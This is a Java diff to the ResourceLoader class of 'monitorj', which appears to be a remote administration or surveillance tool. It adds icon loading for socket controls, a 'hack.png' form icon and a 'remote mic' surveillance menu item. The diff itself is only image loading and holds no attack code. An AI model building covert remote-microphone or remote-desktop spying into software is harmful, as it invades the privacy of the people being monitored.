@@ -12,6 +12,8 @@ public class ResourceLoader {
 
     public static final String IMAGES_LOCATION = "me/jershdervis/monitorj/resources/images/";
 
+    public static ImageIcon FORM_ICON;
+
     public static ImageIcon TAB_CLIENT_LIST;
     public static ImageIcon TAB_COMPILER;
     public static ImageIcon TAB_PLUGIN_CENTER;
@@ -22,6 +24,8 @@ public class ResourceLoader {
 
     public static ImageIcon BUTTON_PLAY;
     public static ImageIcon BUTTON_PAUSE;
+    public static ImageIcon BUTTON_SOCKET_ADD;
+    public static ImageIcon BUTTON_SOCKET_REMOVE;
 
     public static ImageIcon CLIENT_CONNECTION_MENU;
     public static ImageIcon CLIENT_CONNECTION_RESTART;
@@ -37,12 +41,15 @@ public class ResourceLoader {
 
     public static ImageIcon CLIENT_SURVEILLANCE_MENU;
     public static ImageIcon CLIENT_SURVEILLANCE_REMOTE_DESKTOP;
+    public static ImageIcon CLIENT_SURVEILLANCE_REMOTE_MIC;
 
     public static ImageIcon CLIENT_TOOLS_MENU;
     public static ImageIcon CLIENT_TOOLS_REMOTE_CHAT;
 
     static {
         try {
+            FORM_ICON = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "hack.png")));
+
             TAB_CLIENT_LIST = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "clientlist_tab.png")));
             TAB_COMPILER = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "compiler_tab.png")));
             TAB_PLUGIN_CENTER = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "plugincenter_tab.png")));
@@ -53,6 +60,8 @@ public class ResourceLoader {
 
             BUTTON_PLAY = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "button_play.png")));
             BUTTON_PAUSE = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "button_pause.png")));
+            BUTTON_SOCKET_ADD = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "button_socket_add.png")));
+            BUTTON_SOCKET_REMOVE = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "button_socket_remove.png")));
 
             //CONNECTION SUB-MENU ICONS
             CLIENT_CONNECTION_MENU = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "connection.png")));
@@ -71,6 +80,7 @@ public class ResourceLoader {
             //SURVEILLANCE SUB-MENU ICONS
             CLIENT_SURVEILLANCE_MENU = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "surveillance.png")));
             CLIENT_SURVEILLANCE_REMOTE_DESKTOP = new ImageIcon(ImageIO.read(ClassLoader.getSystemResourceAsStream(IMAGES_LOCATION + "surveillance_remotedesktop.png")));
+            CLIENT_SURVEILLANCE_REMOTE_MIC = new ImageIcon(ImageIO.read(ClassLoader.getSystemResourceAsStream(IMAGES_LOCATION + "surveillance_remotemic.png")));
 
             //TOOLS SUB-MENU ICONS
             CLIENT_TOOLS_MENU = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "tools.png")));
